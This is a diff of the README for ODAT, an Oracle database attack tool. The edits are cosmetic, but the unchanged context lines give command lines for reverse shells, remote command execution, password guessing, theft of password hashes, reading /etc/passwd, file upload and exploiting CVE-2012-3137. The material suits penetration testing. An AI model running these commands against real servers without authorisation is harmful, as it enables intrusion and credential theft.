@@ -47,7 +47,7 @@ Thanks to ODAT, you can:
  * UTL_HTTP
  * HttpUriType
  * UTL_TCP
-* exploit the __CVE-2012-313__ ([http://cvedetails.com/cve/2012-3137])
+* exploit the __CVE-2012-313__ (http://cvedetails.com/cve/2012-3137)
  * pickup the session key and salt for arbitrary users
  * attack by dictionary on sessions
 
@@ -83,7 +83,7 @@ Don't forget that an ODAT standalone version exists in *build*: __It is not requ
 
 * Install *python-dev*, *alien* and *libaio1* package (for sqlplus):
 ```bash
-$ sudo apt-get install libaio1 python-dev alien python-pip
+sudo apt-get install libaio1 python-dev alien python-pip
 ```
 
 * Generate DEB files from RPM files thanks to :
@@ -151,7 +151,7 @@ sudo pip install colorlog termcolor pycrypto
 sudo pip install argcomplete && sudo activate-global-python-argcomplete
 ```
 
-* Install the install the __development__ version of pyinstaller (http://www.pyinstaller.org/).
+* Install the __development__ version of pyinstaller (http://www.pyinstaller.org/).
 ```bash
 python setup.py install
 ```
@@ -179,7 +179,7 @@ Modules
 ./odat.py all -h
 ```
 
-Module *all*
+ *all* module
 ---
 
 The *all* module allows you to run all modules (depends on options that you have purchased).
@@ -209,7 +209,7 @@ It is useful __when you want to known what you can do on a database server (with
 ./odat.py all -s 192.168.142.73 -p 1521 -d ORCL -U SYS -P password
 ```
 
-Module *sidguesser*
+ *sidguesser* module
 ---
 
 This module search valid SID only.
@@ -219,7 +219,7 @@ This module search valid SID only.
 ./odat.py passwordguesser -s $SERVER -d $SID --accounts-file=./accounts_small.txt 
 ```
 
-Module *passwordguesser*
+ *passwordguesser* module
 ---
 
 This module has been created in order to try to guess Oracle users passwords.
@@ -235,7 +235,7 @@ This module has been created in order to try to guess Oracle users passwords.
 ```
 
 
-Module *dbmsscheduler*
+ *dbmsscheduler* module
 ---
 
 This module can be used to execute system commands on a remote database server. Useful to get a __reverse tcp shell__.
@@ -252,7 +252,7 @@ __Note 2__: You don't need to open a listen port manually to have a reverse tcp 
 
 > I think it is the __most useful__ and __most effective__ module: Many times I have meet Oracle users who can use the Oracle DBMS_SCHEDULER library but not the JAVA. 
 
-Module *java*
+ *java* module
 ---
 
 This module can be used to execute system commands on a remote database server. Useful to get a __shell__ or a __reverse tcp shell__.
@@ -267,7 +267,7 @@ This module can be used to execute system commands on a remote database server. 
 ./odat.py java -s $SERVER -d $SID -U $USER -P $PASSWORD --reverse-shell
 ```
 
-Module *oradbg*
+ *oradbg* module
 ---
 
 This module can be used to execute system commands on a remote database server:
@@ -277,7 +277,7 @@ This module can be used to execute system commands on a remote database server:
 ./odat.py oradbg -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /bin/ls
 ```
 
-Module *utlhttp*
+ *utlhttp* module
 ---
 
 This module allows you to forge HTTP requests. You can sendand receive HTTP request from the database server.
@@ -301,7 +301,7 @@ echo 'GET / HTTP/1.0\n' > ./temp.txt;
 rm ./temp.txt
 ```
 
-Module *httpuritype*
+ *httpuritype* module
 ---
 
 This module can be used to scan ports and to forge some HTTP requests:
@@ -317,7 +317,7 @@ This module can be used to scan ports and to forge some HTTP requests:
 ./odat.py httpuritype -s $SERVER -d $SID -U $USER -P $PASSWORD --url 127.0.0.1:80
 ```
 
-Module *utltcp*
+ *utltcp* module
 ---
 
 This module can be used to scan ports and it can be used to forge and to send TCP packet (ex: HTTP request).
@@ -334,7 +334,7 @@ echo 'GET / HTTP/1.0\n\n' > ./temp.txt;
 rm ./temp.txt
 ```
 
-Module *ctxsys*
+ *ctxsys* module
 ---
 
 This module can be used to download a file stored on the database server:
@@ -344,7 +344,7 @@ This module can be used to download a file stored on the database server:
 ./odat.py ctxsys -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/passwd
 ```
 
-Module *externaltable*
+ *externaltable* module
 ---
 
 This module can be used to download files or to run script remotly.
@@ -364,7 +364,7 @@ __Notes__:
 ./odat.py externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /tmp/ temp.sh
 ```
 
-Module *dbmsxslprocessor*
+ *dbmsxslprocessor* module
 ---
 
 This module can be used to upload a file on a remote database server:
@@ -374,7 +374,7 @@ This module can be used to upload a file on a remote database server:
 ./odat.py dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt test.txt
 ```
 
-Module *dbmsadvisor*
+ *dbmsadvisor* module
 ---
 
 This module can be used to upload a file on the server.
@@ -384,7 +384,7 @@ This module can be used to upload a file on the server.
 ./odat.py dbmsadvisor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt ./test.txt
 ```
 
-Module *utlfile*
+ *utlfile* module
 ---
 
 This module can be used to:
@@ -408,7 +408,7 @@ This module can be used to:
 ./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --removeFile /tmp/ file.txt
 ```
 
-Module *passwordstealer*
+ *passwordstealer* module
 ---
 
 This module has been created in order to get hashed password quicly and to pickup hashed passwords from the history.
@@ -423,10 +423,10 @@ This module has been created in order to get hashed password quicly and to picku
 ./odat.py passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords
 ```
 
-Module *stealRemotePwds*
+ *stealRemotePwds* module
 ---
 
-This module allows you to exploit the CVE-2012-3137 ([http://www.cvedetails.com/cve/CVE-2012-3137/]) vulnerability easily.
+This module allows you to exploit the CVE-2012-3137 (http://www.cvedetails.com/cve/CVE-2012-3137/) vulnerability easily.
 
 
 __Note__: Need *root* privileges in order to sniff session keys and salts from the network.
@@ -446,34 +446,3 @@ sudo chmod o+r sessions-$SERVER-1521-$SID.txt; ./odat.py stealRemotePwds -s $SER
 | __qhardyfr@gmail.com__  |
 | __quentin.hardy@bt.com__    |
 ---
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
